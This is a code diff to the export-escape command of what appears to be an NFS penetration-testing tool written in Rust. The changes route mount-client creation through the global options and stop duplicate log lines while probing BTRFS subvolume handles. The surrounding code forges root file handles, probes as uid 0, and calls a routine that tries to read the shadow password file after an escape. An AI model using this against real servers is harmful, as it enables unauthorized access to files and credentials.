@@ -13,11 +13,10 @@
 use clap::Parser;
 use colored::Colorize as _;
 
-use crate::cli::probe::{make_client, parse_addr};
+use crate::cli::probe::{make_client, make_mount_client, parse_addr};
 use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
 use crate::engine::file_handle::FileHandleAnalyzer;
 use crate::proto::auth::{AuthSys, Credential};
-use crate::proto::mount::NfsMountClient;
 use crate::proto::nfs3::client::Nfs3Client;
 use crate::proto::nfs3::types::FileHandle;
 use crate::util::stealth::StealthConfig;
@@ -69,7 +68,7 @@ pub async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
     let host = target.host.to_string();
     let export = target.export().unwrap_or("/").to_owned();
 
-    run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan).await?;
+    run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
     crate::cli::emit_replay(globals);
     Ok(())
 }
@@ -83,11 +82,11 @@ pub async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
 /// The printed handle is confirmed live (GETATTR returns NFS3_OK or ACCES) before
 /// being shown. ACCES counts as a hit -- the handle format is valid; only the
 /// credential is rejected.
-async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32) -> anyhow::Result<()> {
+async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
     use nfs3_types::nfs3::nfsstat3;
     eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));
     let addr = parse_addr(host)?;
-    let mount = NfsMountClient::new();
+    let mount = make_mount_client(globals);
     let mnt = mount.mount(addr, export).await?;
 
     // Use uid=0 for probes so permission errors (squashed root) are distinguishable
@@ -98,9 +97,15 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
     // --- Phase 1: known root inodes for the detected filesystem type ---
 
     // BTRFS: try subvolume IDs (256..256+btrfs_subvols) first, then fall through.
+    // construct_btrfs_subvol_handles can yield two variants per subvol on
+    // compound-UUID handles (fsid_type 7 + 6 fallback) -- announce each subvol
+    // ID only once so the operator-facing log isn't doubled.
     let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&mnt.handle, btrfs_subvols);
+    let mut announced = std::collections::HashSet::with_capacity(btrfs.len());
     for candidate in &btrfs {
-        eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
+        if announced.insert(candidate.inode_number) {
+            eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
+        }
         if probe_escape_candidate(&probe_client, candidate).await {
             print_escape_success(candidate, "subvolume (verified)", host);
             try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
